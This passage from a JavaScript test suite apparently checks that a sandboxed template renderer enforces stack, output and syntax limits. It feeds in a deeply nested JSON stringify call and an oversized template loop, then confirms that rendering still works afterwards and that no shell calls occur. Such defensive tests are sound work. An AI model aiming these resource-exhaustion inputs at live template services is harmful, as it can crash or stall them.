      [js('var a = []; for (var i = 0; i < 200000; i++) a = [a]; return JSON.stringify(a)'), 'stack'],
      [`{% for i in range(0, 3000) %}xxxxxxxxxx{% endfor %}`, 'output'],
      ['{{ foo( }}', undefined],
    ];
    for (const [t, limit] of failing) {
      const r = await render(t, limit === 'timeout' ? {} : LONG);
      expect(r.ok, t).toBe(false);
      expect(r.limit, t).toBe(limit);
      expect(await render('Hi {{ name }}', { ctx: { name: 'pilgrim' } }), `after ${t}`).toEqual({ ok: true, output: 'Hi pilgrim', shellCalls: [] });
    }
  });
});
